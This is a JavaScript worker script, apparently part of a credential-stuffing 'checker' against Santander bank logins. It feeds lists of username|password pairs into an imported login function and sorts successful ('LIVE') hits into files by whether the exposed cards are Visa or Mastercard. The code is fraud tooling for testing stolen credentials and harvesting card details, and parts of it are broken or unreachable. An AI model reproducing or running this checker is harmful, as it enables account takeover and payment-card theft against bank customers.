const { parentPort, workerData, threadId } = require('worker_threads')
const { login } = require('./SantaBankerChecker.js')
const fs = require('fs');

var testadas = 0;
var dies = 0;

function loginResultProcess(index, action, retorno) {
    console.log(`${action} login result:`, retorno);
    if (index >= workerData.length)
        return;
    var action = workerData[index];
    var usuario = action.split("|")[0];
    var senha = action.split("|")[1];
    console.log(`trying usuario = ${usuario}, senha = ${senha}`);
    try {
        login(usuario, senha, action, index, loginResultProcess);
    }catch (e) {
        console.log('login error', e);
    }
    return;
    
    this.testadas++;
    let strData = retorno.replace("LIVE|", "LIVE " + action + " > ") + " | INFOS TESTADAS(T): " + this.testadas + " | DIES: " + this.dies + " | THREAD ID: " + threadId;
    strData += "\r\n====================================================================\r\n\r\n";

    if (retorno.indexOf('DIE|') == -1) {
        if (retorno.indexOf('NUMERO: 5') == -1 && retorno.indexOf('NUMERO: 4') == -1) {
            fs.appendFile("lives_sem_cartao.txt", strData, (err) => {
                console.log('appendFile error', err);
            })
        } else if (retorno.indexOf('NUMERO: 5') > -1 && retorno.indexOf('NUMERO: 4') == -1) {
            fs.appendFile("lives_master.txt", strData, (err) => {
                console.log('appendFile error', err);
            })
        } else if (retorno.indexOf('NUMERO: 4') > -1 && retorno.indexOf('NUMERO: 5') == -1) {
            fs.appendFile("lives_visa.txt", strData, (err) => {
                console.log('appendFile error', err);
            })
        } else {
            fs.appendFile("lives_misturadas_visa_master.txt", strData, (err) => {
                console.log('appendFile error', err);
            })
        }
        console.log(retorno.replace("LIVE|", "LIVE " + action + " > ") +  + " | INFOS TESTADAS(T): " + this.testadas + " | DIES: " + this.dies + " | THREAD ID: " + threadId);
    }
    this.dies++;
}

if(workerData instanceof Array) {
    if (workerData.length > 0) {
        index = 0;
        var action = workerData[index];
        var usuario = action.split("|")[0];
        var senha = action.split("|")[1];
        console.log(`trying usuario = ${usuario}, senha = ${senha}`);
        try {
            login(usuario, senha, action, index, loginResultProcess);
        }catch (e) {
            console.log('login error', e);
        }
    }
    for (var i = 0 ; i < workerData.length ; i++) {
        
    }
    workerData.forEach(action => {
        //console.log(action);
        
    });
}

//parentPort.postMessage({ welcome: workerData })